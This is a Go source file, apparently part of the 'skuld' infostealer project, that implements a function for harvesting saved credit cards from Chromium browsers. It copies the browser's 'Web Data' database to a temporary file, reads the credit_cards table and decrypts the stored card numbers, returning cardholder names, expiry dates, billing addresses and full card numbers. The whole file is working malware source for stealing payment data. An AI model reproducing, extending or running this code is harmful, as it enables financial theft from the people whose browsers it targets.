package browsers

import (
	"database/sql"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	_ "modernc.org/sqlite"
)

func (c *Chromium) GetCreditCards(path string) (creditcards []CreditCard, err error) {
	tempPath := filepath.Join(os.TempDir(), "creditcard_db")
	err = fileutil.CopyFile(filepath.Join(path, "Web Data"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	defer os.Remove(tempPath)
	defer db.Close()

	rows, err := db.Query("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
	if err != nil {
		return nil, err
	}

	defer rows.Close()

	for rows.Next() {

		var (
			name, month, year, guid, address, nickname string
			value, encryptValue                        []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue, &address, &nickname); err != nil {
			continue
		}
		if month == "" || year == "" || encryptValue == nil {
			continue
		}

		creditCard := CreditCard{
			GUID:            guid,
			Name:            name,
			ExpirationYear:  year,
			ExpirationMonth: month,
			Address:         address,
			Nickname:        nickname,
		}

		value, err = c.Decrypt(encryptValue)
		if err != nil {
			continue
		}

		creditCard.Number = string(value)
		creditcards = append(creditcards, creditCard)
	}

	return creditcards, nil
}
